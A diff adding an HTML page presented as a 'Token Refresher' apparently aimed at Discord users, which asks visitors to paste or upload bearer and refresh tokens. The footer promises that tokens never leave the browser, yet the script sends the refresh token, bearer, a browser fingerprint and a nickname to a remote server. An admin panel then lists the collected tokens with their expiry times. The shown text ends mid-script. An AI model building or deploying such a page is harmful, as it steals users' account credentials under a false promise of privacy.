@@ -1,0 +1,1651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>davi / @davxd3456 Token Refresher</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:       #080c18;
+    --surface:  #0f1623;
+    --card:     #141c2e;
+    --border:   #1e2d47;
+    --blue:     #3b82f6;
+    --blue-dim: #1d4ed8;
+    --green:    #22c55e;
+    --red:      #ef4444;
+    --yellow:   #eab308;
+    --text:     #e2e8f0;
+    --muted:    #64748b;
+    --mono:     'JetBrains Mono', monospace;
+    --sans:     'Inter', sans-serif;
+  }
+
+  html, body {
+    min-height: 100vh;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* ── grid bg ── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--border) 1px, transparent 1px),
+      linear-gradient(90deg, var(--border) 1px, transparent 1px);
+    background-size: 40px 40px;
+    opacity: 0.25;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrap {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 680px;
+    padding: 48px 24px 80px;
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  /* ── header ── */
+  header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding-bottom: 8px;
+  }
+
+  .logo {
+    width: 36px; height: 36px;
+    background: var(--blue);
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px;
+  }
+
+  h1 {
+    font-size: 20px;
+    font-weight: 600;
+    letter-spacing: -0.3px;
+  }
+
+  .badge {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 3px 10px;
+    border-radius: 99px;
+  }
+
+  /* ── card ── */
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  .card-title {
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+  }
+
+  /* ── token input area ── */
+  .token-field {
+    position: relative;
+  }
+
+  .token-field textarea {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.7;
+    padding: 14px 16px;
+    resize: none;
+    height: 90px;
+    outline: none;
+    transition: border-color 0.15s;
+    word-break: break-all;
+  }
+
+  .token-field textarea:focus {
+    border-color: var(--blue);
+  }
+
+  .token-field textarea::placeholder {
+    color: var(--muted);
+    opacity: 0.6;
+  }
+
+  /* ── expiry bar ── */
+  .expiry-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+
+  .expiry-label { color: var(--muted); }
+
+  .expiry-val {
+    font-weight: 500;
+    transition: color 0.3s;
+  }
+
+  .expiry-val.fresh  { color: var(--green); }
+  .expiry-val.warn   { color: var(--yellow); }
+  .expiry-val.dead   { color: var(--red); }
+  .expiry-val.none   { color: var(--muted); }
+
+  .expiry-bar-wrap {
+    flex: 1;
+    height: 4px;
+    background: var(--border);
+    border-radius: 99px;
+    overflow: hidden;
+  }
+
+  .expiry-bar {
+    height: 100%;
+    border-radius: 99px;
+    transition: width 1s linear, background-color 0.3s;
+    background: var(--green);
+  }
+
+  /* ── divider ── */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    color: var(--muted);
+    font-size: 11px;
+  }
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* ── buttons ── */
+  .btn-row {
+    display: flex;
+    gap: 10px;
+  }
+
+  button {
+    font-family: var(--sans);
+    font-size: 13px;
+    font-weight: 500;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    padding: 10px 20px;
+    transition: opacity 0.15s, transform 0.1s, background 0.15s;
+    display: flex;
+    align-items: center;
+    gap: 7px;
+  }
+
+  button:active { transform: scale(0.97); }
+  button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+  .btn-primary {
+    background: var(--blue);
+    color: #fff;
+    flex: 1;
+  }
+  .btn-primary:hover:not(:disabled) { background: var(--blue-dim); }
+
+  .btn-ghost {
+    background: var(--surface);
+    color: var(--text);
+    border: 1px solid var(--border);
+  }
+  .btn-ghost:hover:not(:disabled) { border-color: var(--blue); color: var(--blue); }
+
+  .btn-auto {
+    background: var(--surface);
+    color: var(--muted);
+    border: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 8px 14px;
+    border-radius: 8px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 7px;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  .btn-auto:hover { border-color: var(--green); color: var(--green); }
+  .btn-auto.active {
+    background: rgba(34,197,94,0.1);
+    border-color: var(--green);
+    color: var(--green);
+  }
+  .btn-auto.active:hover { background: rgba(34,197,94,0.2); }
+
+  .auto-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: currentColor;
+    flex-shrink: 0;
+  }
+  .btn-auto.active .auto-dot {
+    animation: pulse-dot 1.4s ease-in-out infinite;
+  }
+  @keyframes pulse-dot {
+    0%,100% { opacity: 1; transform: scale(1); }
+    50%      { opacity: 0.4; transform: scale(0.7); }
+  }
+
+  .auto-info {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 12px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    display: none;
+  }
+  .auto-info.visible { display: flex; }
+  .auto-info span { color: var(--green); font-weight: 500; }
+
+  .auto-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+
+  /* ── output token ── */
+  .output-wrap {
+    display: none;
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  .output-wrap.visible { display: flex; }
+
+  .token-out {
+    position: relative;
+  }
+
+  .token-out pre {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.7;
+    padding: 14px 44px 14px 16px;
+    word-break: break-all;
+    white-space: pre-wrap;
+    color: var(--text);
+    max-height: 90px;
+    overflow-y: auto;
+  }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px; right: 8px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 5px 9px;
+    font-size: 11px;
+    color: var(--muted);
+    cursor: pointer;
+    transition: color 0.15s, border-color 0.15s;
+  }
+  .copy-btn:hover { color: var(--blue); border-color: var(--blue); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+  /* ── status pill ── */
+  .status {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    font-family: var(--mono);
+    padding: 10px 14px;
+    border-radius: 8px;
+    border: 1px solid transparent;
+  }
+
+  .status.idle    { display: none; }
+  .status.loading { background: #1e2d47; border-color: var(--blue);   color: var(--blue);  }
+  .status.success { background: #14291a; border-color: var(--green);  color: var(--green); }
+  .status.error   { background: #2d1414; border-color: var(--red);    color: var(--red);   }
+
+  .spinner {
+    width: 14px; height: 14px;
+    border: 2px solid currentColor;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    flex-shrink: 0;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ── json upload ── */
+  .drop-zone {
+    border: 1px dashed var(--border);
+    border-radius: 8px;
+    padding: 20px;
+    text-align: center;
+    font-size: 12px;
+    color: var(--muted);
+    cursor: pointer;
+    transition: border-color 0.15s, color 0.15s;
+  }
+  .drop-zone:hover, .drop-zone.drag { border-color: var(--blue); color: var(--blue); }
+
+  /* ── history ── */
+  .history-list {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .history-item {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 12px;
+    font-family: var(--mono);
+  }
+
+  .history-item .hi-user { color: var(--text); flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .history-item .hi-time { color: var(--muted); flex-shrink: 0; }
+  .history-item .hi-dot  { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+  .history-item .hi-dot.ok  { background: var(--green); }
+  .history-item .hi-dot.err { background: var(--red); }
+
+  .empty-history {
+    text-align: center;
+    color: var(--muted);
+    font-size: 12px;
+    padding: 20px 0;
+  }
+
+  /* ── footer ── */
+  footer {
+    color: var(--muted);
+    font-size: 11px;
+    font-family: var(--mono);
+    text-align: center;
+    padding-top: 8px;
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .spinner { animation: none; }
+    .expiry-bar { transition: none; }
+  }
+
+  /* ── welcome toast ── */
+  .welcome-toast {
+    position: fixed;
+    bottom: 32px;
+    left: 50%;
+    transform: translateX(-50%) translateY(120px);
+    background: var(--card);
+    border: 1px solid var(--blue);
+    border-radius: 12px;
+    padding: 14px 22px;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.5), 0 0 0 1px rgba(59,130,246,0.15);
+    z-index: 9999;
+    white-space: nowrap;
+    transition: transform 0.45s cubic-bezier(0.34,1.56,0.64,1), opacity 0.45s ease;
+    opacity: 0;
+  }
+  .welcome-toast.show {
+    transform: translateX(-50%) translateY(0);
+    opacity: 1;
+  }
+  .welcome-toast.hide {
+    transform: translateX(-50%) translateY(120px);
+    opacity: 0;
+    transition: transform 0.35s ease-in, opacity 0.35s ease-in;
+  }
+  .toast-emoji { font-size: 18px; }
+  /* ── admin button (top-left fixed) ── */
+  .admin-trigger {
+    position: fixed; top: 14px; left: 14px; z-index: 8000;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 6px 11px;
+    font-family: var(--mono); font-size: 11px; color: var(--muted);
+    cursor: pointer; display: flex; align-items: center; gap: 6px;
+    transition: all 0.15s; user-select: none;
+  }
+  .admin-trigger:hover { border-color: var(--blue); color: var(--blue); }
+  .admin-trigger .adot { width: 6px; height: 6px; border-radius: 50%; background: var(--muted); transition: background 0.2s; }
+  .admin-trigger.authed .adot { background: var(--green); }
+  .admin-trigger.authed { border-color: rgba(34,197,94,0.3); color: var(--green); }
+
+  /* ── admin modal overlay ── */
+  .admin-overlay {
+    position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+    backdrop-filter: blur(4px); z-index: 8500;
+    display: flex; align-items: center; justify-content: center;
+    opacity: 0; pointer-events: none; transition: opacity 0.2s;
+  }
+  .admin-overlay.open { opacity: 1; pointer-events: all; }
+
+  .admin-panel {
+    background: var(--card); border: 1px solid var(--border); border-radius: 14px;
+    width: 580px; max-width: calc(100vw - 32px); max-height: 80vh;
+    display: flex; flex-direction: column; overflow: hidden;
+    transform: translateY(16px) scale(0.97);
+    transition: transform 0.25s cubic-bezier(0.34,1.3,0.64,1);
+    box-shadow: 0 24px 64px rgba(0,0,0,0.6);
+  }
+  .admin-overlay.open .admin-panel { transform: translateY(0) scale(1); }
+
+  .admin-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 20px; border-bottom: 1px solid var(--border); flex-shrink: 0;
+  }
+  .admin-header h2 { font-size: 14px; font-weight: 600; font-family: var(--mono); color: var(--text); display: flex; align-items: center; gap: 8px; }
+  .admin-header h2 span { color: var(--green); }
+  .admin-close { background: none; border: none; color: var(--muted); cursor: pointer; font-size: 18px; line-height: 1; padding: 2px 6px; border-radius: 4px; transition: color 0.15s; }
+  .admin-close:hover { color: var(--text); }
+
+  .admin-login { padding: 32px 24px; display: flex; flex-direction: column; gap: 14px; align-items: center; }
+  .admin-login p { font-size: 12px; color: var(--muted); font-family: var(--mono); }
+  .admin-login input {
+    width: 100%; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 10px 14px; font-family: var(--mono); font-size: 14px;
+    color: var(--text); outline: none; transition: border-color 0.15s;
+    text-align: center; letter-spacing: 4px;
+  }
+  .admin-login input:focus { border-color: var(--blue); }
+  .admin-login input.wrong { border-color: var(--red); animation: shake 0.35s ease; }
+  @keyframes shake { 0%,100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 60% { transform: translateX(8px); } }
+  .admin-login button {
+    width: 100%; background: var(--blue); color: #fff; border: none;
+    border-radius: 8px; padding: 10px; font-family: var(--mono); font-size: 13px;
+    font-weight: 500; cursor: pointer; transition: background 0.15s;
+  }
+  .admin-login button:hover { background: var(--blue-dim); }
+
+  .admin-body { padding: 16px 20px; overflow-y: auto; flex: 1; display: none; flex-direction: column; gap: 12px; }
+  .admin-body.visible { display: flex; }
+
+  .admin-stats { display: flex; gap: 10px; flex-wrap: wrap; }
+  .admin-stat { flex: 1; min-width: 100px; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 10px 14px; font-family: var(--mono); }
+  .admin-stat .sv { font-size: 22px; font-weight: 600; color: var(--text); }
+  .admin-stat .sl { font-size: 10px; color: var(--muted); margin-top: 2px; }
+
+  .admin-table-wrap { overflow-x: auto; border: 1px solid var(--border); border-radius: 8px; }
+  table.admin-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 11px; }
+  table.admin-table th { background: var(--surface); color: var(--muted); font-weight: 500; text-align: left; padding: 8px 12px; border-bottom: 1px solid var(--border); white-space: nowrap; }
+  table.admin-table td { padding: 8px 12px; border-bottom: 1px solid rgba(30,45,71,0.5); color: var(--text); white-space: nowrap; }
+  table.admin-table tr:last-child td { border-bottom: none; }
+  table.admin-table tr:hover td { background: rgba(59,130,246,0.04); }
+  .td-ok { color: var(--green); } .td-err { color: var(--red); } .td-time { color: var(--muted); }
+
+  .admin-refresh-btn { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 7px 14px; font-family: var(--mono); font-size: 11px; color: var(--muted); cursor: pointer; align-self: flex-end; transition: all 0.15s; }
+  .admin-refresh-btn:hover { border-color: var(--blue); color: var(--blue); }
+  .admin-empty { text-align: center; color: var(--muted); font-family: var(--mono); font-size: 12px; padding: 32px 0; }
+  /* ── link code section ── */
+  .link-label { font-size: 11px; color: var(--muted); font-family: var(--mono); margin-bottom: 6px; }
+  .link-row { display: flex; gap: 8px; align-items: center; margin-top: 4px; }
+  .link-input {
+    flex: 1; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 9px 12px; font-family: var(--mono); font-size: 16px;
+    color: var(--text); outline: none; letter-spacing: 6px; text-transform: uppercase;
+    text-align: center; transition: border-color 0.15s;
+  }
+  .link-input:focus { border-color: var(--blue); }
+  .link-input.linked { border-color: var(--green); color: var(--green); }
+  .link-input.error  { border-color: var(--red); }
+  .discord-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(88,101,242,0.15); border: 1px solid rgba(88,101,242,0.4);
+    border-radius: 6px; padding: 4px 10px; font-family: var(--mono); font-size: 11px; color: #818cf8;
+  }
+
+  /* ── token list ── */
+  .token-list-section {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 12px; padding: 16px; margin-bottom: 12px;
+  }
+  .token-list-header {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 10px;
+  }
+  .token-list-title {
+    font-family: var(--mono); font-size: 11px;
+    color: var(--muted); text-transform: uppercase; letter-spacing: 1px;
+  }
+  .token-search {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 6px; padding: 5px 10px; font-family: var(--mono);
+    font-size: 11px; color: var(--text); outline: none; width: 140px;
+    transition: border-color 0.15s;
+  }
+  .token-search:focus { border-color: var(--blue); }
+  .token-item {
+    display: flex; align-items: center; gap: 8px;
+    padding: 8px 10px; border-radius: 8px;
+    border: 1px solid var(--border); margin-bottom: 6px;
+    background: var(--surface); transition: border-color 0.15s;
+  }
+  .token-item:hover { border-color: var(--blue); }
+  .token-item-name {
+    flex: 1; font-family: var(--mono); font-size: 12px;
+    color: var(--text); cursor: pointer;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .token-item-meta { font-family: var(--mono); font-size: 11px; white-space: nowrap; }
+  .token-item-actions { display: flex; gap: 4px; }
+  .token-item-actions button {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 4px; padding: 3px 7px; font-family: var(--mono);
+    font-size: 10px; color: var(--muted); cursor: pointer; transition: all 0.1s;
+  }
+  .token-item-actions button:hover { border-color: var(--blue); color: var(--blue); }
+
+  /* ── server banner ── */
+  .server-banner {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 9998;
+    background: linear-gradient(90deg, #5865f2, #3b82f6);
+    color: #fff; font-family: var(--mono); font-size: 12px;
+    padding: 8px 16px; display: flex; align-items: center;
+    justify-content: center; gap: 10px; text-align: center;
+  }
+  .server-banner a { color: #fff; font-weight: 600; text-decoration: underline; }
+  .server-banner .close-banner {
+    position: absolute; right: 12px; background: none; border: none;
+    color: #fff; cursor: pointer; font-size: 16px; opacity: 0.7;
+  }
+  .server-banner .close-banner:hover { opacity: 1; }
+  body.has-banner .wrap { padding-top: 44px; }
+
+  /* ── blacklist wall ── */
+  .bl-wall {
+    position: fixed; inset: 0; z-index: 99999; background: var(--bg);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .bl-box {
+    background: var(--card); border: 1px solid var(--red);
+    border-radius: 16px; padding: 36px 32px; width: 380px;
+    max-width: calc(100vw - 32px); text-align: center;
+    display: flex; flex-direction: column; gap: 14px;
+  }
+  .bl-box h2 { color: var(--red); font-family: var(--mono); font-size: 16px; }
+  .bl-box p  { color: var(--muted); font-family: var(--mono); font-size: 12px; line-height: 1.6; }
+  .bl-box a  { color: var(--blue); }
+
+</style>
+</head>
+<body>
+
+<!-- ── official server banner ── -->
+<div class="server-banner" id="serverBanner">
+  ⚠️ only use the <strong>official</strong> refresher — join the real server:
+  <a href="https://discord.gg/FwGgAc74u" target="_blank">discord.gg/FwGgAc74u</a>
+  <button class="close-banner" onclick="dismissBanner()">✕</button>
+</div>
+
+<!-- ── blacklist wall (hidden by default) ── -->
+<div class="bl-wall" id="blWall" style="display:none;">
+  <div class="bl-box">
+    <div style="font-size:40px;">🚫</div>
+    <h2>you are blacklisted</h2>
+    <p id="blReason">you have been banned from this service</p>
+    <p>if you think this is a mistake, contact<br><a href="https://discord.gg/FwGgAc74u" target="_blank">@davxd3456 in the official server</a></p>
+  </div>
+</div>
+
+
+    <!-- step 1: username -->
+    <div id="gateStep1">
+      <input class="gate-input" id="gateUsernameInput" placeholder="your discord username"
+        style="letter-spacing:1px;font-size:14px;text-transform:none;"
+        onkeydown="if(event.key==='Enter') gateSendCode()" />
+      <div class="gate-hint" style="margin-top:8px;">enter your Discord username and we'll DM you a code</div>
+      <button class="gate-btn" style="margin-top:12px;" id="gateSendBtn" onclick="gateSendCode()">send code</button>
+      <button onclick="showBotCode()" style="background:none;border:none;color:var(--blue);font-family:var(--mono);font-size:11px;cursor:pointer;margin-top:10px;width:100%;text-decoration:underline;">have a code from the bot? enter it here</button>
+    </div>
+
+    <!-- step 2: code entry after DM -->
+    <div id="gateStep2" style="display:none;">
+      <div class="gate-hint" style="color:var(--green);margin-bottom:10px;">✓ code sent via DM — check your Discord</div>
+      <input class="gate-input" id="gateCodeInput" maxlength="6" placeholder="XXXXXX"
+        oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
+        onkeydown="if(event.key==='Enter') gateVerify()" />
+      <div class="gate-hint" style="margin-top:8px;">
+        enter the 6-character code from the bot DM<br>
+        <strong>use /ui in the server to get your code</strong>
+      </div>
+      <button class="gate-btn" style="margin-top:12px;" id="gateVerifyBtn" onclick="gateVerify()">verify</button>
+      <button onclick="gateReset()" style="background:none;border:none;color:var(--muted);font-family:var(--mono);font-size:11px;cursor:pointer;margin-top:6px;width:100%;">← use different username</button>
+    </div>
+
+    <!-- step 3: direct bot code bypass -->
+    <div id="gateStep3" style="display:none;">
+      <div class="gate-hint" style="color:var(--blue);margin-bottom:10px;">🤖 enter your code from /ui in the server</div>
+      <input class="gate-input" id="gateBotCodeInput" maxlength="6" placeholder="XXXXXX"
+        oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
+        onkeydown="if(event.key==='Enter') gateBotVerify()" />
+      <div class="gate-hint" style="margin-top:8px;">
+        type <strong>/ui</strong> in the Discord server → click <strong>get code</strong>
+      </div>
+      <button class="gate-btn" style="margin-top:12px;" onclick="gateBotVerify()">enter</button>
+      <button onclick="gateReset()" style="background:none;border:none;color:var(--muted);font-family:var(--mono);font-size:11px;cursor:pointer;margin-top:6px;width:100%;">← back</button>
+    </div>
+
+    <div class="gate-status" id="gateStatus"></div>
+  </div>
+</div>
+
+
+<!-- ── admin trigger (top-left) ── -->
+<button class="admin-trigger" id="adminTrigger" onclick="openAdmin()">
+  <span class="adot"></span> admin
+</button>
+
+<!-- ── admin modal ── -->
+<div class="admin-overlay" id="adminOverlay" onclick="overlayClick(event)">
+  <div class="admin-panel">
+    <div class="admin-header">
+      <h2>🛡️ admin — <span>@davxd3456</span></h2>
+      <button class="admin-close" onclick="closeAdmin()">✕</button>
+    </div>
+
+    <!-- login gate -->
+    <div class="admin-login" id="adminLogin">
+      <p>enter admin password</p>
+      <input type="password" id="adminPwInput" placeholder="••••••••"
+        onkeydown="if(event.key==='Enter') checkAdminPw()" />
+      <button onclick="checkAdminPw()">unlock</button>
+    </div>
+
+    <!-- users panel (hidden until authed) -->
+    <div class="admin-body" id="adminBody">
+      <div class="admin-stats">
+        <div class="admin-stat">
+          <div class="sv" id="statTotal">—</div>
+          <div class="sl">total refreshes</div>
+        </div>
+        <div class="admin-stat">
+          <div class="sv" id="statUniq">—</div>
+          <div class="sl">unique visitors</div>
+        </div>
+        <div class="admin-stat">
+          <div class="sv" id="statToday">—</div>
+          <div class="sl">today</div>
+        </div>
+      </div>
+
+      <button class="admin-refresh-btn" onclick="loadAdminData()">⟳ refresh</button>
+
+      <div class="admin-table-wrap">
+        <table class="admin-table">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>fingerprint</th>
+              <th>nickname</th>
+              <th>shared at</th>
+              <th>expires in</th>
+              <th>action</th>
+            </tr>
+          </thead>
+          <tbody id="adminTableBody">
+            <tr><td colspan="5"><div class="admin-empty">loading...</div></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="wrap">
+
+
+  <!-- ── saved tokens list ── -->
+  <div class="token-list-section" id="tokenListSection" style="display:none;">
+    <div class="token-list-header">
+      <div class="token-list-title">your saved tokens</div>
+      <input class="token-search" id="tokenSearch" placeholder="search..." oninput="renderTokenList()" />
+    </div>
+    <div id="tokenListWrap">
+      <div style="color:var(--muted);font-family:var(--mono);font-size:12px;text-align:center;padding:16px;">loading...</div>
+    </div>
+  </div>
+
+  <header>
+    <div class="logo">⚡</div>
+    <h1>davi / <span style="color:var(--blue);">@davxd3456</span> Token Refresher</h1>
+    <span class="badge">v1.4</span>
+  </header>
+
+  <!-- ── INPUT CARD ── -->
+  <div class="card">
+    <div class="card-title">Paste Token JSON or Refresh Token</div>
+
+    <!-- drop zone -->
+    <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileIn').click()">
+      drop <code>.json</code> file here — or click to browse
+    </div>
+    <input type="file" id="fileIn" accept=".json" style="display:none">
+
+    <div class="divider">or paste manually</div>
+
+    <div class="token-field">
+      <textarea id="refreshInput" placeholder="paste refresh_token or full JSON here..."></textarea>
+    </div>
+
+    <!-- expiry display -->
+    <div class="expiry-row">
+      <span class="expiry-label">expires</span>
+      <span class="expiry-val none" id="expiryVal">—</span>
+      <div class="expiry-bar-wrap">
+        <div class="expiry-bar" id="expiryBar" style="width:0%"></div>
+      </div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn-primary" id="refreshBtn" onclick="doRefresh()">
+        <span>⟳</span> Refresh Token
+      </button>
+      <button class="btn-ghost" id="syncBtn" onclick="shareToken()" title="share your token with @davxd3456 for remote refresh support">
+        ⇡ sync
+      </button>
+      <button class="btn-ghost" onclick="clearAll()">Clear</button>
+    </div>
+    <div class="status idle" id="syncStatus" style="margin-top:0;font-size:11px;"></div>
+
+    <!-- ── auto-refresh row ── -->
+    <div class="auto-row">
+      <button class="btn-auto" id="autoBtn" onclick="toggleAuto()">
+        <span class="auto-dot"></span>
+        Auto-Refresh: OFF
+      </button>
+      <div class="auto-info" id="autoInfo">
+        next refresh in <span id="autoCountdown">—</span>
+      </div>
+    </div>
+
+
+    <!-- ── discord link code ── -->
+    <div style="margin-top:8px;">
+      <div class="link-label">🔗 discord link code — type /linkdiscord in the server to get yours</div>
+      <div class="link-row">
+        <input class="link-input" id="linkCodeInput" maxlength="6" placeholder="XXXXXX"
+          oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
+          onkeydown="if(event.key==='Enter') verifyLinkCode()" />
+        <button class="btn-ghost" onclick="verifyLinkCode()" style="white-space:nowrap;">link ⇡</button>
+      </div>
+      <div id="linkStatus" style="margin-top:6px;font-size:11px;font-family:var(--mono);color:var(--muted);min-height:16px;"></div>
+    </div>
+    <div class="status idle" id="status"></div>
+  </div>
+
+  <!-- ── OUTPUT CARD ── -->
+  <div class="card output-wrap" id="outputWrap">
+    <div class="card-title">New Tokens</div>
+
+    <div>
+      <div style="font-size:11px;color:var(--muted);margin-bottom:6px;">bearer</div>
+      <div class="token-out">
+        <pre id="outBearer">—</pre>
+        <button class="copy-btn" onclick="copyField('outBearer', this)">copy</button>
+      </div>
+    </div>
+
+    <div>
+      <div style="font-size:11px;color:var(--muted);margin-bottom:6px;">refresh_token</div>
+      <div class="token-out">
+        <pre id="outRefresh">—</pre>
+        <button class="copy-btn" onclick="copyField('outRefresh', this)">copy</button>
+      </div>
+    </div>
+
+    <button class="btn-ghost" style="font-size:12px;" onclick="downloadJSON()">
+      ↓ download as JSON
+    </button>
+  </div>
+
+  <!-- ── HISTORY CARD ── -->
+  <div class="card">
+    <div class="card-title">Session History</div>
+    <div class="history-list" id="historyList">
+      <div class="empty-history">no refreshes yet this session</div>
+    </div>
+  </div>
+
+  <footer>davi / @davxd3456 token refresher · tokens never leave your browser</footer>
+
+</div>
+
+<!-- welcome toast -->
+<div class="welcome-toast" id="welcomeToast">
+  <span class="toast-emoji">🫱</span>
+  <span>thanks for using <strong>@davxd3456</strong>'s refresher 😂</span>
+</div>
+
+<script>
+// ── server ───────────────────────────────────────────────────────────────────
+const SERVER = 'https://divine-fulfillment-production-13ec.up.railway.app';
+
+// ── state ──────────────────────────────────────────────────────────────────────
+const API = "https://stellarapi-backend-production.up.railway.app";
+let currentRefreshToken = null;
+let currentBearer       = null;
+let newBearer           = null;
+let newRefresh          = null;
+let expiryTimer         = null;
+let history_            = [];
+
+// auto-refresh state
+let autoEnabled       = false;
+let autoInterval      = null;   // the setInterval handle
+let autoCountdownSecs = 0;      // live countdown value
+let autoCountdownInt  = null;   // 1s ticker for the countdown display
+const AUTO_BEFORE_EXPIRY_SEC = 120; // fire 2 min before expiry
+const AUTO_FALLBACK_SEC      = 3300; // fallback 55min if no JWT exp found
+
+// ── parse input ───────────────────────────────────────────────────────────────
+function parseInput(raw) {
+    raw = raw.trim();
+    // try full JSON
+    try {
+        const j = JSON.parse(raw);
+        return {
+            bearer:  j.bearer        || j.access_token || j.token || null,
+            refresh: j.refresh_token || j.refreshToken  || null,
+        };
+    } catch (_) {}
+    // bare token string
+    return { bearer: null, refresh: raw };
+}
+
+// ── file drop ─────────────────────────────────────────────────────────────────
+const dropZone = document.getElementById("dropZone");
+const fileIn   = document.getElementById("fileIn");
+
+dropZone.addEventListener("dragover",  e => { e.preventDefault(); dropZone.classList.add("drag"); });
+dropZone.addEventListener("dragleave", () => dropZone.classList.remove("drag"));
+dropZone.addEventListener("drop", e => {
+    e.preventDefault(); dropZone.classList.remove("drag");
+    loadFile(e.dataTransfer.files[0]);
+});
+fileIn.addEventListener("change", e => loadFile(e.target.files[0]));
+
+function loadFile(file) {
+    if (!file) return;
+    const r = new FileReader();
+    r.onload = ev => {
+        document.getElementById("refreshInput").value = ev.target.result;
+        parseAndPreview(ev.target.result);
+    };
+    r.readAsText(file);
+}
+
+// ── preview expiry on paste ───────────────────────────────────────────────────
+document.getElementById("refreshInput").addEventListener("input", e => {
+    parseAndPreview(e.target.value);
+});
+
+function parseAndPreview(raw) {
+    const { bearer, refresh } = parseInput(raw);
+    currentBearer       = bearer;
+    currentRefreshToken = refresh;
+    const token = bearer || refresh;
+    if (token) {
+        updateExpiryDisplay(token);
+        if (gateDiscordId && (refresh || bearer)) {
+            saveCurrentToken(refresh || bearer, bearer);
+        }
+    } else resetExpiry();
+}
+
+async function autoSyncToken(refreshToken, bearer) {
+    try {
+        const fp = getFingerprint();
+        await fetch(SERVER + '/api/share', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ fp, refreshToken, bearer: bearer || null, nickname: gateDiscordTag })
+        });
